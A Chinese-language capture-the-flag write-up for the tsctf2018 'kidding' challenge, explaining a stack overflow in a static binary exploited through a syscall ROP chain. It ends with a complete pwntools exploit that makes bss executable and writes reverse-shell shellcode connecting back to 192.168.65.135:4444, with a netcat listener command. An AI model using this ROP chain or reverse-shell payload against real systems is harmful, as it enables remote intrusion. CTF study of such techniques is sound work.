---
title: kidding
categories:
- tsctf2018
---
# tsctf->kidding

## 程序逻辑

这个程序非常简单，输出两句话，栈溢出。不过这里坑的是把标准输入输出和标准错误都给关掉了。另外程序是静态编译的，没有动态运行库，因此不存在got表之类的东西，考察的是ROP的运用。
(前天做梦梦到做出来了，昨天没做出来，晚上看了17的wp解决了困惑，今早终于做出来了Orz)

![main](./1.jpg)

## 漏洞利用

漏洞就是这个栈溢出，p4nda师傅说这种静态编译的一般都是用系统调用，关闭输入输出的情况下大多使用dup2把文件描述符复制到sockfd上，构造reverse shell，在本地开一个socket监听，远端连接本地socket，其shell里执行的结果会输出到我们接收的socket中，从而得到flag。主要思路是打开stdin、stdout和stderr，用sys_mprotect给bss段加上可执行权限，再将可以执行reverse_shell的shellcode写入到bss段，最终调转到这里执行即可

### step1

根据Linux64位的调用规则，rax存储syscall的系统调用号，rdi、rsi、rdx分别为函数调用从左到右的前三个参数存储的寄存器。使用ROPgadget可以找到可用的gadgets，下图为示例，其余同理。之后拼接凑成rop_function，可以接收三个参数并执行执行系统调用的函数

![gadgets](./2.jpg)

### step2

用step1得到的rop_funtion打开stdin,stdout,stderr。用类似的调用mprotect(0x601000,0x2000,7)。这里需要注意mprotect调用的地址需要是按页对齐的，范围len也是按页对齐的，即4kb的整数倍，2^12对应十六进制为0x1000的整数倍，因此虽然我选择写入shellcode的地址是0x602160(buf)，需要改变的却是整个段的执行权限，7表示rwx。

### step3

向bss段写入shellcode,这里的shellcode是网上找的[refernce](https://www.exploit-db.com/exploits/41477)，根据自己的IP地址把第一个push的字节码修改一下，比如我的ip是192.168.65.135，即把"\x68\xc0\xa8\x01\x2d"改成"\x68\xC0\xA8\x41\x87"。可以先将shellcode执行一遍看看是否无误，本地起监听的命令为
```shell
nc -l 4444 -vv
```
step3是遇到的最大的难题，因为我一直在寻找一个系统调用往指定地址写数据(甚至花了一天时间)。直到思而不得看了17的wp才发现自己实在是太笨了- -,哪需要什么系统调用去写数据，直接一个mov qword ptr des,[src]就能把数据挪过去，需要的是把数据放在栈上，然后pop des,pop src,mov des, [src]即可。这里还是用ROPgadget配合grep寻找，我们一次写入8字节，因此grep -F 'mov qword ptr ['即可。注意这里是rdi+0x20，因此我们的rdi应当是target_adddr - 0x20

![find](./3.jpg)

### step4

ret(0x602160)即可

## exp.py

```py
#coding=utf-8
from pwn import *
debug = 0
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
p = process('./kidding')
elf = ELF('./kidding')
if debug:
    gdb.attach(p,gdbscript="b *0x40029c")
#    gdb.attach(p,gdbscript="b *0x400740")

call_rbx = 0x400455
call_rax = 0x40024e

pop_rbx = 0x40045d
pop_rdi = 0x40077c
pop_rsi_r15 = 0x400d64
pop_rdx = 0x4005d5
pop_rax = 0x400121
mov_rdi_0x20_rax = 0x400c01
syscall = 0x400740
main_addr = 0x40025a

def rop_func(rax,rdi,rsi,rdx):
    payload = p64(pop_rax) + p64(rax) + p64(pop_rdi) + p64(rdi) + p64(pop_rsi_r15) + p64(rsi) + p64(0) + p64(pop_rdx) + p64(rdx) + p64(syscall)
    #payload += '6'*8*6
    return payload

def rop1_func(rax,rdi,rsi,rdx):
    payload = p64(pop_rax) + p64(rax) + p64(pop_rdi) + rdi + p64(pop_rsi_r15) + p64(rsi) + p64(0) + p64(pop_rdx) + p64(rdx) + p64(syscall)   
    return payload

def rop2_func(rax,rdi,rsi,rdx):
    payload = p64(pop_rax) + p64(rax) + p64(pop_rdi) + p64(rdi) + p64(pop_rsi_r15) + rsi + p64(0) + p64(pop_rdx) + p64(rdx) + p64(syscall)   
    return payload
reverse_shellcode = "\x68\xc0\xa8\x41\x87\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"
def write_to_bss():
    payload = ""
    total_len = len(reverse_shellcode)
    i = 0
    while total_len > 0:
        if total_len >= 8:
            payload += p64(pop_rax) + reverse_shellcode[i*8:i*8+8] + p64(pop_rdi) + p64(0x602160 - 0x20 + i * 8) + p64(mov_rdi_0x20_rax)
            i += 1
            total_len -= 8
        else:
            payload += p64(pop_rax) + reverse_shellcode[i*8:] + (8-len(reverse_shellcode[i*8:])) * '\x90' + p64(pop_rdi) + p64(0x602160 - 0x20 + i * 8) + p64(mov_rdi_0x20_rax)
            i += 1
            total_len = 0
    return payload
def exp():
    p.recvline()
    p.recvline()

    #reverse shell
    open0 = rop_func(2,0,2,7)
    open1 = rop_func(2,1,2,7)
    open2 = rop_func(2,2,2,7)
    change_bss = rop_func(10,0x601000,0x2000,7)
    #mov shellcode to bss

    payload = 'a'*0x18
    payload += open0 + open1 + open2 + change_bss + write_to_bss() + p64(0x602160)

    p.send(payload)
    p.interactive()
    p.close()

exp()
```
